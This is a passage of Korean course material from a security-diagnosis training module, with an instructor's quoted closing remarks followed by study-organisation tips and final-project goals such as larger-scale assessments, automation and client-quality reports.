"모두 다 지금까지 수고 많으셨고요. 평가 발표에는 이걸로 마치도록 하고 남은 시간은 아마 여기 운영팀에서 또 전달을 할 텐데
오늘 여러분들 이따가 또 사전 다음 커리큘럼 진행을 위한 사전평가가 또 있을 예정이거든요.

그 사전평가 준비를 하거나 지금까지 준비해왔던 내용들 잘 정리하면서 저한테 배웠던 내용들 잘 정리해놓고
잘 자료, 노션이나 이런 걸로 정리해놨던 것들을 잘 가지고 계시길 바랄게요.

모두 지금까지 수고 많으셨습니다."
```

**학습 정리 권장 사항**:
1. **Notion/Obsidian으로 학습 내용 정리**: 팀별 프로젝트 내용, 강사 피드백, 코드 스니펫 등
2. **GitHub에 코드 정리**: 진단 스크립트, 웹 애플리케이션 코드, 인프라 코드 등
3. **개인 포트폴리오 작성**: 프로젝트 소개, 역할, 기술 스택, 성과 등
4. **취약점 예제 DB 구축**: 직접 구현한 취약점 코드와 수정 방법을 정리
5. **진단 체크리스트 작성**: 향후 진단 프로젝트에 재사용할 체크리스트

**최종 프로젝트 준비**:
이번 모듈 프로젝트의 결과물을 바탕으로, 최종 프로젝트에서는 다음을 목표로 합니다.
- 더 큰 규모의 시스템 진단 (100개 이상의 진단 항목)
- 더 정교한 자동화 (AI, CI/CD 통합)
- 실무 수준의 리포트 (고객에게 제공 가능한 품질)
- 팀 협업 능력 향상 (더 많은 팀원, 역할 분담)

**모두 수고하셨습니다!** 이번 모듈 프로젝트에서 배운 내용을 바탕으로, 최종 프로젝트와 실무에서 뛰어난 보안 전문가로 성장하시길 바랍니다.

---

# Section 7 Part 2 종료

**다음 단계**: 모든 섹션 파일 병합 (cat 명령어)
